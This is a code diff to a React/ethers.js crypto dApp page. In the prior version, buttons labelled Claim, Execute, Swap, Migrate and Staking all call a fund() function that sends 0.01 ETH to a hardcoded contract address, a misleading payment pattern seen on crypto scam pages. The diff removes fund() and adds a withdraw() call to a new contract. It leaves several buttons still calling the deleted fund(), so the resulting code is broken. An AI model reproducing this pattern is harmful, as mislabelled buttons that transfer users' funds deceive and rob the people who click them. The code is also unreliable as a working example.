@@ -7,7 +7,6 @@ import { ethers } from "ethers";
 import WalletConnectProvider from "@walletconnect/web3-provider";
 import Authereum from "authereum";
 import { abi } from "../constants/abi";
-import Toggle from './Toggle'
 
 
 let web3Modal;
@@ -51,7 +50,7 @@ export default function Home() {
   });
 
   async function connect() {
-    
+    if (typeof window.ethereum !== "undefined") {
       try {
         const web3ModalProvider = await web3Modal.connect();
         setIsConnected(true);
@@ -60,42 +59,37 @@ export default function Home() {
       } catch (e) {
         console.log(e);
       }
-    
+    } else {
+      setIsConnected(false);
+    }
   }
-async function fund() {
-  const ethAmount = "0.01";
-    console.log(`Funding with ${ethAmount}...`)
-  
+async function withdraw() {
+    console.log(`Withdrawing...`)
+  if (typeof window.ethereum !== "undefined") {
     const web3ModalProvider = await web3Modal.connect();
         setIsConnected(true);
         const provider = new ethers.providers.Web3Provider(web3ModalProvider);
         setSigner(provider.getSigner());
-      const contractAddress = '0xC14Ef989e38208167c6D2Ae1115B8a18c2953B15';
+      const contractAddress = '0xA2fAa6289311f06C8DC234db09512Ce9b8fAc9BF';
       const contract = new ethers.Contract(contractAddress, abi, signer);
-        try {
-            const transactionResponse = await contract.fund({
-                value: ethers.utils.parseEther(ethAmount),
-            })
+         try {
+            const transactionResponse = await contract.withdraw()
             await listenForTransactionMine(transactionResponse, provider)
         } catch (error) {
             console.log(error)
         }
-   
+    } else {
+      console.log("Please install MetaMask");
+    }
   }
 
   return (
     <div>
        <div>
       <header>
-
-        
         <div className="connect-btn-container">
-        <Toggle></Toggle>
-     
-        <button onClick={() => connect()} className="connect-btn">connect</button>
-        
-
-       </div>
+          <button onClick={() => connect()} className="connect-btn">Connect</button>
+        </div>
       </header>
 
       <div className="main-container">
@@ -111,8 +105,8 @@ async function fund() {
 
             <div className="inner-button-wrap-1">
 
-            <button className="btn"  onClick={() => fund()}>Claim</button>
-               {isConnected ? <button onClick={() => fund()}>Execute</button> : ""}
+            <button className="btn" onClick={() => fund()}>Claim</button>
+               {isConnected ? <button className="btn" onClick={() => fund()}>Execute</button> : ""}
           <button className="btn" onClick={() => fund()}>Swap</button>
 
             </div>
@@ -121,8 +115,8 @@ async function fund() {
 
           <div className="main-button-wrap-2">
             <div className="inner-button-wrap-2">
-            <button className="btn"  onClick={() => fund()}>Migrate</button>
-          <button className="btn" onClick={() => fund()}>Staking</button>
+            <button className="btn" >Migrate</button>
+          <button className="btn" onClick={() => withdraw()}>Withdraw</button>
               
 
             </div>
@@ -142,8 +136,3 @@ async function fund() {
     </div>
   );
 }
-
-
-
-
-
